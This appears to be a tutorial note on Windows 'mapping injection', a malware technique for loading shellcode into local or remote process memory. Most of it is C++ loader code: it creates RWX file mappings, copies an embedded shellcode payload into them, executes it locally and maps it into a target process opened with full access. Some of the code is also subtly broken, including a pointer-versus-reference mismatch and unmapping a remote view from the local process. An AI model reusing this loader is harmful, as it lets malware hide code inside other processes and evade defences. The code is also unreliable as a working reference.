### Mapping Injection

Basically, the **virtual memory mappings** of a process are used to inject code or data into specific memory pages. Example APIs used: `MapViewOfFile`, `CreateFileMapping`, etc.

Local and remote mapping injections are possible.

Remote injection uses function like `MapViewOfFile2` to map memory from private(LOCAL) address space into another process's address space. 

Similary, other APIs like `CreateFileMappingFromApp` and `MapViewOfFileFromApp` can also be used; and shared memory sections can be created using `SECTION_MAP_READ`, `SECTION_MAP_WRITE`, and `SECTION_MAP_EXECUTE` permissions which can then be mapped into target process.

```cpp
BOOL LocalMapInject(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID &pAddress) {

	BOOL   bSTATE         = TRUE;
	HANDLE hFile          = NULL;
	PVOID  pMapAddress    = NULL;


	// Create a file mapping handle with RWX memory permissions
	// This does not allocate RWX view of file unless it is specified in the subsequent MapViewOfFile call  
	hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
	if (hFile == NULL) {
		printf("[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Maps the view of the payload to the memory 
	pMapAddress = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sPayloadSize);
	if (pMapAddress == NULL) {
		printf("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}
	
    // Copying the payload to the mapped memory
	memcpy(pMapAddress, pPayload, sPayloadSize);
	
_EndOfFunction:
	pAddress = pMapAddress;
	if (hFile)
		CloseHandle(hFile);
	return bSTATE;
}

BOOL RemoteMapInject(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID &pAddress) {

	BOOL        bSTATE            = TRUE;
	HANDLE      hFile             = NULL;
	PVOID       pMapLocalAddress  = NULL,
                pMapRemoteAddress = NULL;

    // Create a file mapping handle with RWX memory permissions
	// This does not allocate RWX view of file unless it is specified in the subsequent MapViewOfFile call  
	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
	if (hFile == NULL) {
		printf("\t[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}
  
    // Maps the view of the payload to the memory 
	pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sPayloadSize);
	if (pMapLocalAddress == NULL) {
		printf("\t[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

    // Copying the payload to the mapped memory
	memcpy(pMapLocalAddress, pPayload, sPayloadSize);

	// Maps the payload to a new remote buffer in the target process
	pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
	if (pMapRemoteAddress == NULL) {
		printf("\t[!] MapViewOfFile2 Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	printf("\t[+] Remote Mapping Address : 0x%p \n", pMapRemoteAddress);

_EndOfFunction:
	pAddress = pMapRemoteAddress;
	if (hFile)
		CloseHandle(hFile);
	return bSTATE;
}


int main() {

    // Sample payload (MessageBoxA)
    BYTE payload[] = {
        0x6A, 0x00, 0x68, 0x61, 0x63, 0x6B, 0x65, 0x68,
        0x4D, 0x61, 0x6C, 0x64, 0x65, 0x8B, 0xC4, 0x50,
        0x6A, 0x00, 0x68, 0x57, 0x6F, 0x77, 0x21, 0x68,
        0x48, 0x61, 0x63, 0x6B, 0x8D, 0x4C, 0x24, 0x04,
        0x51, 0xFF, 0x15, 0x10, 0x20, 0x40, 0x00, 0x31,
        0xC0, 0xC3
    };

    PVOID pMappedAddress = NULL;
    if (LocalMapInject(payload, sizeof(payload), &pMappedAddress)) {
        std::cout << "[+] Payload Mapped Successfully at Address: " << pMappedAddress << '\n';
        
        // Execute the payload
        ((void(*)())pMappedAddress)();
    } else {
        std::cerr << "[!] Payload Mapping Failed\n";
    }

    UnmapViewOfFile(pMappedAddress);

    PVOID pRemoteMappedAddress = NULL;
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, /* Target PID */ 1234);
    if (RemoteMapInject(hProcess, payload, sizeof(payload), &pRemoteMappedAddress)) {
        std::cout << "[+] Payload Remotely Mapped Successfully at Address: " << pRemoteMappedAddress << '\n';
    } else {
        std::cerr << "[!] Remote Payload Mapping Failed\n";
    }

    UnmapViewOfFile(pRemoteMappedAddress);
    CloseHandle(hProcess);

    return 0;
}
```